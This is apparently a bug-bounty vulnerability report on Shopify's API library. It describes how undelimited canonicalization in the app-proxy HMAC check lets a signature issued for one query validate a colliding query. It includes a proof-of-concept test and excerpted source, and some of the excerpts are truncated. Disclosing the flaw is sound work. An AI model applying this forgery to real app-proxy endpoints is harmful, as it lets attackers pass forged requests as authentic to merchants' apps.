## Title
Ambiguous canonicalization in `stringifyQueryForAppProxy` allows HMAC/signature reuse across different query parameter sets - (File: `packages/apps/shopify-api/lib/utils/hmac-validator.ts`)

## Summary
`stringifyQueryForAppProxy` builds the string to be HMAC'd by concatenating `key=value` pairs with **no delimiter** between pairs. Because key/value boundaries are not escaped or delimited, two structurally different query objects can canonicalize to the identical byte string, causing `generateLocalHmac`/`validateHmac` to accept a signature that Shopify issued for one query as valid for a completely different query.

## Finding Description
`stringifyQueryForAppProxy` reduces sorted `[key, value]` entries into a string via [1](#0-0) 
with no separator (such as `&`) between successive `key=value` segments. `generateLocalHmac` feeds this string directly into the HMAC: [2](#0-1) 

Because query parameter keys are ordinary strings that can legally contain `=` (e.g., produced by a raw query string like `a%3D1b=2`, which any standard URL-decoding query parser, including `URLSearchParams`, decodes to key `a=1b`), two distinct logical parameter sets can produce byte-identical canonical strings:

- Query A: `{a: '1', b: '2', ...rest}` → canonical `...a=1b=2...`
- Query B: `{'a=1b': '2', ...rest}` → canonical `...a=1b=2...`

Both canonicalize identically, so `generateLocalHmac` computes the same HMAC for both, and `safeCompare` in `validateHmac` passes for either query given a signature computed for the other: [3](#0-2) 

The app-proxy entry point in the framework packages consumes this exact API directly on the raw, attacker/customer-influenced request search params, with no additional integrity check (e.g., no requirement that parameters match an expected schema, no source-IP restriction beyond the signature check): [4](#0-3) 

`normalizeQuery` only guards against duplicate values for the small `APP_PROXY_SINGLE_VALUE_PARAMS` set (`hmac`, `shop`, `signature`, `timestamp`) [5](#0-4) 
but does nothing to prevent the key/value-boundary ambiguity described above for any other parameter (including app-trusted ones like `logged_in_customer_id`, `path_prefix`, or arbitrary application-defined proxy params).

## Impact Explanation
An attacker (anonymous storefront visitor) can obtain a legitimately signed app-proxy request for a query of their choosing (app-proxy endpoints accept arbitrary extra query params from anonymous visitors, per the app's proxy configuration), then present a differently-structured, colliding query directly to the app's public app-proxy URL together with the previously observed signature. `validateHmac` will treat this forged request as authentic. This is a signature/authenticity-forgery bug (AUTHENTICITY invariant violated): it maps to Shopify's "signature/HMAC forgery for app-proxy requests" bounty impact class, since the invariant that a signature uniquely authenticates one specific set of parameters is broken.

## Likelihood Explanation
Exploitation requires only: (1) the ability to make a normal, anonymous request to the merchant's app-proxy URL to obtain a genuinely signed "donor" query (a normal, low-privilege capability), and (2) crafting a raw query string with a percent-encoded `=` inside a parameter key when calling the app-proxy endpoint directly (standard URL syntax, decoded by `URLSearchParams`/most query parsers). No secret, no privileged role, and no non-default configuration is required — this is exactly the documented usage in `authenticate.ts`. It is fully repeatable and deterministic.

## Recommendation
Change `stringifyQueryForAppProxy` to use an unambiguous, delimited canonical form (e.g., join pairs with `&` and percent-encode `=`/`&` inside keys and values before concatenation, matching Shopify's actual documented app-proxy signing algorithm precisely), so that no two distinct key/value sets can ever produce the same canonical string.

## Proof of Concept
```ts
import {shopifyApi} from '../..';
import {testConfig} from '../../__tests__/test-config';
import crypto from 'crypto';

function sign(str: string, secret: string) {
  return crypto.createHmac('sha256', secret).update(str).digest('hex');
}

test('signature for query A also validates colliding query B', async () => {
  const secret = 'my super secret key';
  const shopify = shopifyApi(testConfig({apiSecretKey: secret}));
  const timestamp = String(Math.trunc(Date.now() / 1000) - 30);

  // Query A: two distinct keys
  const queryA = {a: '1', b: '2', shop: 's.myshopify.com', timestamp};
  // Query B: single key containing an embedded '=' (from raw query "a%3D1b=2&...")
  const queryB = {'a=1b': '2', shop: 's.myshopify.com', timestamp};

  const localHmacA = await (shopify.utils as any).generateLocalHmac
    ? undefined
    : undefined;

  // Sign queryA canonical string exactly like Shopify would
  const canonical = `a=1b=2shop=s.myshopify.comtimestamp=${timestamp}`;
  const signature = sign(canonical, secret);

  const signedA = {...queryA, signature};
  const forgedB = {...queryB, signature}; // same signature, different logical query

  await expect(
    shopify.utils.validateHmac(signedA, {signator: 'appProxy'}),
  ).resolves.toBe(true);

  await expect(
    shopify.utils.validateHmac(forgedB, {signator: 'appProxy'}),
  ).resolves.toBe(true); // forged query B incorrectly validates with A's signature
});
```

function stringifyQueryForAppProxy(query: AuthQuery): string {
  return Object.entries(query)
    .sort(([val1], [val2]) => val1.localeCompare(val2))
    .reduce((acc, [key, value]) => {
      return `${acc}${key}=${Array.isArray(value) ? value.join(',') : value}`;
    }, '');
}

export function generateLocalHmac(config: ConfigInterface) {
  return async (

    signator: HMACSignator = 'admin',

    const {hmac: _hmac, signature: _signature, ...query} = params;

    const queryString =
      signator === 'admin'
        ? stringifyQueryForAdmin(query)
        : stringifyQueryForAppProxy(query);

    return createSHA256HMAC(config.apiSecretKey, queryString, HashFormat.Hex);
